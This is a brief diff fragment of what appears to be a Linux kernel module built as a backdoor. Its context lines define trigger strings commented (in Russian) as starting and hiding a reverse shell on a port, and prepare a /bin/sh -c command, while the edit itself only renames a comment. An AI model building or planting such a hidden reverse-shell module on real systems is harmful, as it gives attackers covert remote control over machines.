@@ -20,7 +20,7 @@ MODULE_LICENSE("GPL");
 #define SHLL "wanna_shll"   // reverse shell на определенном порту.
 #define HIDP "wanna_hidp"   // "скрытие" reverse shell.
 
-                                                                                        /*   Global variables & structs   */
+                                                                                        /*   Global variables   */
 
 
 static char *argv[4] = {"/bin/sh","-c", NULL, NULL};
